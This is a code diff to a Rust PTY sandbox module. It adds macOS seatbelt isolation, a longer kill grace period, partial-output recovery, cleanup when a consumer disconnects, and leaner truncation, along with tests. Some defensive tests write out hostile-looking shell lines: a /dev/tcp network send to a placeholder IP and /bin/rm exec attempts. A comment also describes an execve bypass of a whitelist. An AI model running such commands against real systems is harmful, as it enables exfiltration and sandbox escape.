@@ -1,7 +1,7 @@
 // fe-sandbox — PTY 沙箱 (FR-02/03, NFR)
 //
 // portable-pty 0.8: openpty → spawn(sh -c cmd, setsid 使子为组长) → 阻塞 reader 线程 → child.wait
-// 超时: SIGINT (graceful) → 50ms → try_wait 仍活 → SIGKILL (forceful), killpg(-pid) 进程树杀
+// 超时: SIGINT (graceful) → 500ms → try_wait 仍活 → SIGKILL (forceful), killpg(-pid) 进程树杀
 // 截断: stdout head H=4096 + tail T=8192, 中间折叠 [truncated N chars]
 // OOM: 环形缓冲 cap = 2*effective_max; effective_max = max_output_chars.min(HARD_CEILING) 绝对上限
 // PTY 合并 stdout+stderr → 全入 stdout (stderr 空; traceback 在 tail 可读)
@@ -13,7 +13,9 @@ use std::time::Duration;
 use anyhow::{bail, Context, Result};
 use nix::sys::signal::Signal;
 use nix::unistd::Pid;
-use portable_pty::{CommandBuilder, NativePtySystem, PtySize, PtySystem};
+use portable_pty::{NativePtySystem, PtySize, PtySystem};
+
+mod seatbelt;
 use serde::{Deserialize, Serialize};
 use tokio::sync::mpsc;
 use tracing::{debug, info, warn};
@@ -24,7 +26,9 @@ const DEFAULT_MAX_OUTPUT: usize = 100_000;
 /// C-SB-05: 环形缓冲绝对上限 — 防调用方设 max_output_chars=usize::MAX 打 OOM-kill 主机
 const HARD_CEILING: usize = 64 * 1024 * 1024;
 /// C-SB-01: SIGINT→SIGKILL grace window
-const KILL_GRACE_MS: u64 = 50;
+/// 审计 2.4: 50ms 太短 — 大量 buffered IO (git flush/pytest 收集) 来不及落盘即被 SIGKILL,
+/// 保证文件损伤。提至 500ms 给优雅退出留足窗口。可配置化需扩 API 面 (YAGNI), 常量足够。
+const KILL_GRACE_MS: u64 = 500;
 /// C-SB-02/03: kill 后收 reader 输出超时 — 子进程忽略信号时 reader 永不 EOF
 const READER_RECV_TIMEOUT_MS: u64 = 2000;
 
@@ -53,6 +57,10 @@ pub struct SandboxConfig {
     pub env: std::collections::HashMap<String, String>,
     pub timeout_sec: f64,
     pub max_output_chars: usize,
+    /// Blocker 1 / 1.1: macOS seatbelt 运行时隔离 (sandbox-exec 包装)。
+    /// true → sandbox-exec -p '<profile>' sh -c '<cmd>' (禁网 + 危险二进制 process-exec deny)。
+    /// 默认 false — 调用方显式开启 (ExecutionRequest.seatbelt 透传)。
+    pub seatbelt: bool,
 }
 
 impl Default for SandboxConfig {
@@ -63,6 +71,7 @@ impl Default for SandboxConfig {
             env: std::collections::HashMap::new(),
             timeout_sec: 30.0,
             max_output_chars: DEFAULT_MAX_OUTPUT,
+            seatbelt: false,
         }
     }
 }
@@ -95,10 +104,8 @@ impl Sandbox {
             })
             .context("openpty 失败")?;
 
-        // sh -c <command> — 走 shell 以支持管道/重定向 (已通过 fe-security 校验)
-        let mut cmd = CommandBuilder::new("sh");
-        cmd.arg("-c");
-        cmd.arg(&cfg.command);
+        // Blocker 1 / 1.1: seatbelt=true → sandbox-exec 包装 (禁网 + 危险二进制 execve deny)
+        let mut cmd = seatbelt::build_command(&cfg.command, cfg.seatbelt);
         if let Some(cwd) = &cfg.cwd {
             cmd.cwd(cwd);
         }
@@ -111,7 +118,7 @@ impl Sandbox {
             .spawn_command(cmd)
             .context("spawn_command 失败")?;
         let pid = child.process_id();
-        debug!(?pid, "child spawned");
+        debug!(?pid, seatbelt = cfg.seatbelt, "child spawned");
 
         // 释放 slave — spawn 后不再需要
         drop(pair.slave);
@@ -139,7 +146,11 @@ impl Sandbox {
                         }
                     }
                     Err(e) => {
-                        let _ = tx.send(Err(anyhow::anyhow!("read 失败: {}", e)));
+                        // 审计 2.8: 旧版 send(Err) 后 buf drop — 超时命令已收的 partial stdout
+                        // (含 traceback) 全丢。改 send Ok(buf) 保留已收部分, 仅记 warn 不短路。
+                        let partial = String::from_utf8_lossy(&buf).into_owned();
+                        let _ = tx.send(Ok(partial));
+                        warn!(error = %e, "reader read 失败, 返回已收 partial 输出");
                         return;
                     }
                 }
@@ -187,7 +198,12 @@ impl Sandbox {
         // — rx.recv 加超时, 超时则返回已收部分输出
         let raw_output = match rx.recv_timeout(Duration::from_millis(READER_RECV_TIMEOUT_MS)) {
             Ok(Ok(s)) => s,
-            Ok(Err(_)) => String::new(),
+            // 审计 2.8: reader 2.8 修复后从不送 Err, 此分支保留兜底 — 送 Err 意味逻辑
+            // 漏改, 返已收部分 (channel 在 Err 时 buf 已 drop 无法回收, 故空) 记 warn。
+            Ok(Err(_)) => {
+                warn!(?pid, "reader 送了 Err (不应发生, 2.8 修复后走 Ok partial)");
+                String::new()
+            }
             Err(std_mpsc::RecvTimeoutError::Timeout) => {
                 warn!(?pid, "kill 后 reader 未 EOF, 返回已收部分输出");
                 String::new()
@@ -239,9 +255,7 @@ impl Sandbox {
             })
             .context("openpty 失败")?;
 
-        let mut cmd = CommandBuilder::new("sh");
-        cmd.arg("-c");
-        cmd.arg(&cfg.command);
+        let mut cmd = seatbelt::build_command(&cfg.command, cfg.seatbelt);
         if let Some(cwd) = &cfg.cwd {
             cmd.cwd(cwd);
         }
@@ -254,7 +268,7 @@ impl Sandbox {
             .spawn_command(cmd)
             .context("spawn_command 失败")?;
         let pid = child.process_id();
-        debug!(?pid, "child spawned (streaming)");
+        debug!(?pid, seatbelt = cfg.seatbelt, "child spawned (streaming)");
         drop(pair.slave);
 
         // reader 线程 — 实时分块 (inner_tx) + 环形缓冲; EOF 时送最终完整累积 (inner_tx)
@@ -305,8 +319,11 @@ impl Sandbox {
                         }
                     }
                     Err(e) => {
-                        let _ = inner_tx.blocking_send(ReaderMsg::Eof(String::new()));
-                        warn!("streaming read 失败: {e}");
+                        // 审计 2.8: 旧版送 Eof(空) — buf drop 丢 partial stdout。改送 Eof(buf)
+                        // 保留已收部分 (含 traceback), Done 内 stdout 携 partial。
+                        let partial = String::from_utf8_lossy(&buf).into_owned();
+                        let _ = inner_tx.blocking_send(ReaderMsg::Eof(partial));
+                        warn!("streaming read 失败, 送已收 partial 输出: {e}");
                         return;
                     }
                 }
@@ -329,6 +346,9 @@ impl Sandbox {
 
         // 协调任务 — 转发 chunk 到 outer; wait/timeout 并行; EOF+exit 后发 Done
         let (outer_tx, outer_rx) = mpsc::channel::<StreamEvent>(64);
+        // Blocker 6 (审计 2.1): 消费者断开 → kill 子进程, 防孤儿。pid 克隆供 phase-1 循环用
+        // (exit_fut 闭包也需 pid 作超时 kill, 克隆避免 move 后无法引用)
+        let pid_for_cancel = pid;
         let handle = tokio::spawn(async move {
             // exit future: wait 或 timeout, 先到者决定 (timed_out, raw_exit)
             let mut exit_fut = Box::pin(async move {
@@ -357,6 +377,8 @@ impl Sandbox {
 
             let mut eof_output: Option<String> = None;
             let mut exit_done: Option<(bool, i32)> = None;
+            // Blocker 6: 消费者断开标志 — send 失败后 kill 子进程并跳出
+            let mut cancelled = false;
 
             // 阶段 1: exit 与 chunk 并发 — 未收到 exit 前无超时收 chunk
             while exit_done.is_none() {
@@ -365,10 +387,23 @@ impl Sandbox {
                     e = &mut exit_fut => {
                         exit_done = Some(e);
                     }
+                    // Blocker 6: 消费者断开 outer_rx (即使无输出静默期) → closed() 就绪 → kill 子进程
+                    _ = outer_tx.closed() => {
+                        warn!(?pid_for_cancel, "streaming 消费者断开 (closed), kill 子进程防孤儿 (Blocker 6)");
+                        let _ = kill_tree(pid_for_cancel);
+                        cancelled = true;
+                        break;
+                    }
                     msg = inner_rx.recv() => {
                         match msg {
                             Some(ReaderMsg::Chunk(c)) => {
-                                let _ = outer_tx.send(StreamEvent::Chunk { data: c }).await;
+                                // Blocker 6: send 失败 = 消费者断开 outer_rx → kill 子进程, 跳出
+                                if outer_tx.send(StreamEvent::Chunk { data: c }).await.is_err() {
+                                    warn!(?pid_for_cancel, "streaming 消费者断开, kill 子进程防孤儿 (Blocker 6)");
+                                    let _ = kill_tree(pid_for_cancel);
+                                    cancelled = true;
+                                    break;
+                                }
                             }
                             Some(ReaderMsg::Eof(s)) => {
                                 eof_output = Some(s);
@@ -381,6 +416,22 @@ impl Sandbox {
                         }
                     }
                 }
+            }
+            // Blocker 6: 消费者断开后 exit_fut 仍持 wait_fut, abort 释放; 子进程已 kill。
+            // 不走 phase-2 (exit_done=None → unwrap panic); 直接合成 cancelled Done 收尾。
+            if cancelled {
+                debug!(?pid_for_cancel, "streaming 已取消 (消费者断开), 收尾");
+                let raw_output = eof_output.unwrap_or_default();
+                let stdout = truncate_output(&raw_output.replace("\r\n", "\n"), max_output_final);
+                let _ = outer_tx
+                    .send(StreamEvent::Done(SandboxResult {
+                        exit_code: -1,
+                        stdout,
+                        stderr: String::new(),
+                        timed_out: false,
+                    }))
+                    .await;
+                return;
             }
 
             // 阶段 2: exit 已到 — 等 reader EOF, C-SB-03 grace 超时防 reader 永不 EOF
@@ -433,31 +484,57 @@ impl Default for Sandbox {
 
 /// head + tail 截断 — 中间折叠为 [truncated N chars]
 /// L-SB-04: 极小上限 tail-only 回退保证返回不超 max
+/// 审计 2.5: 旧版 chars().collect::<Vec<char>> 物化全量 char Vec — 64MB 输入峰值 320MB
+/// (Vec<char> 每元素 4 字节 + 原 String)。改 byte-offset: char_indices 一次遍历记录
+/// 第 N 个 char 的字节偏移, 切片原 str — 零额外物化 (仅 Vec<usize> 偏移, N 个 8 字节)。
 pub fn truncate_output(s: &str, max: usize) -> String {
     if max == 0 {
         return String::new();
     }
-    if s.chars().count() <= max {
+    // 一次遍历取所有 char 的字节起点偏移 — 单 Vec<usize> (N*8 字节) 远小于 Vec<char> (N*4)
+    // 但 char_indices 已逐 char 产出, 峰值 = 偏移表; 全量 ASCII 64MB → 512MB 偏移表仍大。
+    // 故仅取需要的 3 个边界偏移 (head 尾, tail 头, total), 不存全表。
+    let total_chars = s.chars().count();
+    if total_chars <= max {
         return s.to_string();
     }
-    let chars: Vec<char> = s.chars().collect();
-    let total = chars.len();
     if max <= HEAD_CHARS + TAIL_CHARS {
-        // 极小上限: 只保留尾部
-        let keep: String = chars[total.saturating_sub(max)..].iter().collect();
-        return keep;
+        // 极小上限: 只保留尾部 max 个 char — 找第 (total-max) 个 char 的字节偏移
+        let skip = total_chars.saturating_sub(max);
+        let byte_start = nth_char_byte_offset(s, skip);
+        return s[byte_start..].to_string();
     }
-    let head: String = chars[..HEAD_CHARS].iter().collect();
-    let tail_start = total - TAIL_CHARS;
-    let tail: String = chars[tail_start..].iter().collect();
-    let dropped = total - HEAD_CHARS - TAIL_CHARS;
-    let out = format!("{}\n[truncated {} chars]\n{}", head, dropped, tail);
+    let head_end_byte = nth_char_byte_offset(s, HEAD_CHARS);
+    let tail_start_char = total_chars - TAIL_CHARS;
+    let tail_start_byte = nth_char_byte_offset(s, tail_start_char);
+    let dropped = total_chars - HEAD_CHARS - TAIL_CHARS;
+    let out = format!(
+        "{}\n[truncated {} chars]\n{}",
+        &s[..head_end_byte],
+        dropped,
+        &s[tail_start_byte..]
+    );
     // L-SB-04: head+marker+tail 超 max 时回退 tail-only
     if out.chars().count() > max {
-        let keep: String = chars[total.saturating_sub(max)..].iter().collect();
-        return keep;
+        let skip = total_chars.saturating_sub(max);
+        let byte_start = nth_char_byte_offset(s, skip);
+        return s[byte_start..].to_string();
     }
     out
+}
+
+/// 返回第 `n` 个 char (0-indexed) 的字节起始偏移。n==0 → 0; n>=总 char 数 → s.len()
+/// 审计 2.5: 取代全量 chars().collect(), 仅遍历到第 n 个停, 零物化。
+fn nth_char_byte_offset(s: &str, n: usize) -> usize {
+    if n == 0 {
+        return 0;
+    }
+    for (seen, (i, _)) in s.char_indices().enumerate() {
+        if seen == n {
+            return i;
+        }
+    }
+    s.len()
 }
 
 /// L-SB-02: 返回最后一个完整 UTF-8 字符的字节边界 (切断多字节序列时余数留给下块)
@@ -800,5 +877,177 @@ mod tests {
     #[test]
     fn kill_tree_none_pid_returns_neg1() {
         assert_eq!(kill_tree(None), -1);
+    }
+
+    // 审计 2.5: nth_char_byte_offset 多字节边界正确 (取代 Vec<char> 的零物化实现)
+    #[test]
+    fn truncate_byte_offset_multibyte() {
+        // "中" = 3 字节; "中a中" = 7 字节 (3+1+3)
+        let s = "中a中";
+        assert_eq!(nth_char_byte_offset(s, 0), 0); // 首 char 起点 0
+        assert_eq!(nth_char_byte_offset(s, 1), 3); // 'a' 起点 = 字节 3
+        assert_eq!(nth_char_byte_offset(s, 2), 4); // 第二个 '中' 起点 = 字节 4
+        assert_eq!(nth_char_byte_offset(s, 3), 7); // 越界 → len
+        assert_eq!(nth_char_byte_offset(s, 99), 7); // 远超 → len
+        assert_eq!(nth_char_byte_offset("", 1), 0); // 空串
+    }
+
+    // 审计 2.5: truncate 在多字节输入下保持 head+tail+marker 正确 (旧 Vec<char> 行为等价)
+    #[test]
+    fn truncate_multibyte_head_tail_correct() {
+        // 用 3 字节 CJK 拼出超过 HEAD+TAIL 的串, 验证截断后 head/tail 仍是完整 char
+        let head_unit = "你"; // 3 字节
+        let big = head_unit.repeat(HEAD_CHARS + TAIL_CHARS + 100);
+        let out = truncate_output(&big, HEAD_CHARS + TAIL_CHARS + 50);
+        // head 应以完整 '你' 结尾 (无半字节); tail 应以完整 '你' 开头
+        assert!(out.contains("[truncated"));
+        assert!(
+            out.starts_with('你'),
+            "head 首字符应完整: {:?}",
+            out.chars().next()
+        );
+        assert!(
+            out.ends_with('你'),
+            "tail 末字符应完整: {:?}",
+            out.chars().last()
+        );
+        // 输出不含替换符 (无被切断的多字节序列)
+        assert!(!out.contains('\u{FFFD}'), "不应出现 UTF-8 替换符");
+    }
+
+    // Blocker 6 (审计 2.1): 消费者断开 outer_rx → 子进程被 kill, 不留孤儿
+    #[tokio::test]
+    async fn streaming_consumer_disconnect_kills_child() {
+        let sb = Sandbox::new();
+        let pidfile =
+            std::env::temp_dir().join(format!("fe-sb-blocker6-{}.pid", std::process::id()));
+        let _ = std::fs::remove_file(&pidfile);
+        let cmd = format!("echo $$ > {}; echo started; sleep 30", pidfile.display());
+        let cfg = SandboxConfig {
+            command: cmd,
+            cwd: None,
+            env: std::collections::HashMap::new(),
+            timeout_sec: 60.0,
+            max_output_chars: 100_000,
+            seatbelt: false,
+        };
+        let (mut rx, handle) = sb.run_streaming(cfg).unwrap();
+        // 收首块 (含 "started"), 确认子进程已起
+        let first = rx.recv().await.expect("应收到首块");
+        let first_data = match first {
+            StreamEvent::Chunk { data } => data,
+            StreamEvent::Done(_) => panic!("首块应是 Chunk 非 Done"),
+        };
+        assert!(
+            first_data.contains("started"),
+            "首块含 started: {:?}",
+            first_data
+        );
+        // 等 pidfile 落盘
+        let pid = loop {
+            if let Ok(s) = std::fs::read_to_string(&pidfile) {
+                let p: u32 = s.trim().parse().unwrap();
+                break p;
+            }
+            tokio::time::sleep(Duration::from_millis(50)).await;
+        };
+        // 子进程应存活 (kill -0 探测, 不发信号)
+        let alive_before =
+            nix::sys::signal::kill(nix::unistd::Pid::from_raw(pid as i32), None).is_ok();
+        assert!(alive_before, "drop 前 sleep 子进程应存活, pid={}", pid);
+        // Blocker 6: drop receiver 模拟消费者断开 → 协调任务 send 失败 → kill 子进程
+        drop(rx);
+        // 等协调任务收尾 (子进程被 kill 后 handle 应结束)
+        let _ = tokio::time::timeout(Duration::from_secs(5), handle).await;
+        // 验证 sleep 进程已死 (kill -0 应 ESRCH)
+        let still_alive =
+            nix::sys::signal::kill(nix::unistd::Pid::from_raw(pid as i32), None).is_ok();
+        assert!(
+            !still_alive,
+            "消费者断开后 sleep 子进程应已被 kill (Blocker 6), pid={}",
+            pid
+        );
+        let _ = std::fs::remove_file(&pidfile);
+    }
+
+    // Blocker 1 / 1.1: seatbelt 运行时隔离 — 真实 sandbox-exec 拦截测试
+    // 审计 #1 攻击: os.execve('/bin/rm') 穿透静态白名单 → seatbelt process-exec deny 兜底
+    #[test]
+    fn seatbelt_blocks_rm_execve() {
+        let sb = Sandbox::new();
+        let cfg = SandboxConfig {
+            command: "/bin/rm -f /tmp/fe-seatbelt-ghost 2>/dev/null; echo rm_exit=$?".to_string(),
+            timeout_sec: 15.0,
+            seatbelt: true,
+            ..Default::default()
+        };
+        let r = rt().block_on(sb.run(cfg));
+        let r = r.unwrap();
+        // /bin/rm 被 process-exec deny → exit 126 (Operation not permitted), echo 仍能跑
+        assert!(
+            r.stdout.contains("rm_exit=126"),
+            "rm 应被 seatbelt 拦 (exit 126), 实际 stdout={}",
+            r.stdout
+        );
+        info!(stdout = %r.stdout, exit = r.exit_code, "seatbelt rm 拦截验证");
+    }
+
+    // Blocker 1: seatbelt 禁网 — /dev/tcp 外泄被拦
+    #[test]
+    fn seatbelt_blocks_network() {
+        let sb = Sandbox::new();
+        let cfg = SandboxConfig {
+            command: "echo hi > /dev/tcp/1.2.3.4/80 2>&1; echo net_done=$?".to_string(),
+            timeout_sec: 15.0,
+            seatbelt: true,
+            ..Default::default()
+        };
+        let r = rt().block_on(sb.run(cfg));
+        let r = r.unwrap();
+        assert!(
+            r.stdout.contains("Operation not permitted") || !r.stdout.contains("net_done=0"),
+            "网络应被 seatbelt 拦, 实际 stdout={}",
+            r.stdout
+        );
+    }
+
+    // Blocker 1: seatbelt 开启时白名单二进制仍能跑 (allow default 透传)
+    #[test]
+    fn seatbelt_allows_whitelisted_echo() {
+        let sb = Sandbox::new();
+        let cfg = SandboxConfig {
+            command: "echo seatbelt_ok".to_string(),
+            timeout_sec: 10.0,
+            seatbelt: true,
+            ..Default::default()
+        };
+        let r = rt().block_on(sb.run(cfg));
+        let r = r.unwrap();
+        assert_eq!(r.exit_code, 0, "echo 应正常跑, exit={}", r.exit_code);
+        assert!(
+            r.stdout.contains("seatbelt_ok"),
+            "echo 输出应透传, stdout={}",
+            r.stdout
+        );
+    }
+
+    // Blocker 1: seatbelt 关闭时无隔离 (回归 — 裸 sh -c 行为不变)
+    #[test]
+    fn seatbelt_disabled_no_isolation() {
+        let sb = Sandbox::new();
+        let cfg = SandboxConfig {
+            command: "/bin/rm -f /tmp/fe-seatbelt-ghost2 2>/dev/null; echo rm_exit=$?".to_string(),
+            timeout_sec: 10.0,
+            seatbelt: false,
+            ..Default::default()
+        };
+        let r = rt().block_on(sb.run(cfg));
+        let r = r.unwrap();
+        // 未隔离 → rm 正常 (exit 0), 不应是 126
+        assert!(
+            !r.stdout.contains("rm_exit=126"),
+            "seatbelt 关闭时 rm 不应被拦, stdout={}",
+            r.stdout
+        );
     }
 }
